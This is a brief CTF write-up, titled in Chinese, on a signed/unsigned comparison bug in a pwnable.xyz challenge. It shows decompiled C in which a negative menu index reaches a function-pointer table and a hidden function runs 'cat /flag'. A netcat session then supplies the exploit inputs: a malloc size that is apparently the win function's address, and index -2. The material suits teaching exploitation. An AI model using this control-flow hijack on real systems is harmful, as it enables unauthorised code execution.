unsigned 与 signed类型比较问题



```c
void main(void)

{
  int iVar1;
  
  setup();
  do {
    while( true ) {
      print_menu();
      printf("> ");
      iVar1 = read_long();
      if (iVar1 < 5) break;
      puts("Invalid.");
    }
    (**(code **)(vtable + (long)iVar1 * 8))();
  } while( true );
}

void print_menu(void)

{
  puts("1. Malloc\n2. Free\n3. Read\n4. Write\n0. Exit");
  return;
}

void _(void)

{
  system("cat /flag");
  return;
}

void do_malloc(void)

{
  printf("Size: ");
  size = read_long();
  heap_buffer = malloc(size);
  if (heap_buffer == (void *)0x0) {
    heap_buffer = (void *)0x1;
  }
  return;
}

```



```
$ nc svc.pwnable.xyz 30007
1. Malloc
2. Free
3. Read
4. Write
0. Exit
> 1
Size: 4196913
1. Malloc
2. Free
3. Read
4. Write
0. Exit
> -2
```

